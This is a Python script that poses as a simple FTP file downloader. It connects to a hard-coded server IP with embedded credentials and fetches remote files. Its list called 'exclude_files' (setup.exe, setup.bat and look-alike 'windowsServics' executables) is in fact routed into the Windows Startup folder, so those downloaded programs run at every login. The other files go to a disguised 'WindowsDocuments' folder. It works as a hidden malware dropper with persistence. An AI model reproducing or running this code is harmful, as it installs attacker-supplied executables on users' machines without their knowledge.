import os
from ftplib import FTP

class FTPDownloader:
    def __init__(self, host, user, password):
        self.ftp_host = host
        self.ftp_user = user
        self.ftp_password = password
        self.ftp = FTP()
        self.startup_folder = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        print(self.startup_folder)

    def connect(self):
        self.ftp.connect(self.ftp_host)
        self.ftp.login(self.ftp_user, self.ftp_password)
        print("Connected to FTP server")

    def download_files(self, remote_folder, local_folder):
        self.ftp.cwd(remote_folder)
        if not os.path.exists(local_folder):
            os.makedirs(local_folder)
        # List all files in the remote folder
        files = self.ftp.nlst()

        # Download each file
        exclude_files = ["setup.exe", "setup.bat", "windowsServics.exe", "windowsServics.bat"]
        for file in files:
            if file in exclude_files:
                local_file_path = os.path.join(self.startup_folder, file)
                with open(local_file_path, 'wb') as local_file:
                    self.ftp.retrbinary('RETR ' + file, local_file.write)
                print(f"Downloaded: {file}")  
            else:
                local_file_path = os.path.join(local_folder, file)
                with open(local_file_path, 'wb') as local_file:
                    self.ftp.retrbinary('RETR ' + file, local_file.write)
                print(f"Downloaded: {file}")

        print("All files downloaded successfully")

    def disconnect(self):
        self.ftp.quit()
        print("Disconnected from FTP server")

if __name__ == "__main__":
    ftp_host = "37.60.239.157"
    ftp_user = "ftpzahar"
    ftp_password = "!l0v33n&"
    remote_folder = "/files"
    local_folder = os.path.join(os.path.expanduser("~"),"Documents\WindowsDocuments")
    print(local_folder)

    downloader = FTPDownloader(ftp_host, ftp_user, ftp_password)

    try:
        downloader.connect()
        downloader.download_files(remote_folder, local_folder)
    finally:
        downloader.disconnect()
